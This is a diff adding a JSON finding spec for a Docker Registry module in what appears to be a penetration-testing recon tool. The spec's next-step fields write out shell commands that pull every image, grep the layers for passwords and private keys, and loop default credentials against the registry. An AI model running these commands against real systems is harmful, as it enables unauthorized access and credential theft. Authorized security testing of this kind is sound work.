@@ -1,0 +1,34 @@
+{
+  "service": "docker_registry",
+  "summary": "Minimal but correct: fingerprints /v2/ via Docker-Distribution-Api-Version header, lists /v2/_catalog if anonymous read succeeds, or emits an info finding when auth is required. No image pull, no layer scan, no default-cred / brute-force against docker login.",
+  "module_files": [
+    "/home/kali/Desktop/projects/recce/recce/services/docker_registry.py"
+  ],
+  "findings": [
+    {
+      "kind": "dockerreg_anonymous_catalog",
+      "title_pattern": "Docker Registry v2 catalog readable without auth",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "Anon /v2/_catalog returning 200 with a repositories list is deterministic proof of unauth read.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Pull each repository's manifest (/v2/<repo>/manifests/latest), fetch each layer blob, extract layer tarball, grep for embedded credentials (docker-compose env, embedded .aws, .kube, .env files, private keys). Fully unauthenticated. Wire secrets into known_creds.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -sk http://<ip>:5000/v2/_catalog?n=1000; for r in <repos>; do docker pull <ip>:5000/$r:latest; docker save <ip>:5000/$r:latest | tar -xO | grep -Ei 'password|api_key|BEGIN.*PRIVATE'; done"
+    },
+    {
+      "kind": "dockerreg_authed",
+      "title_pattern": "Docker Registry v2 reachable (auth required)",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "401 with Bearer challenge \u2014 fingerprint only, no vuln.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Try seeded creds (admin:admin, registry:registry, harbor:Harbor12345 for Harbor) against docker login, or hit /v2/token endpoint with basic auth guesses.",
+      "promotion_risk": "medium",
+      "tester_next_step": "for pw in admin registry password Harbor12345; do curl -sku admin:$pw http://<ip>:5000/v2/_catalog && echo pwned:$pw; done"
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_creds (any looted docker registry token)"
+  ]
+}
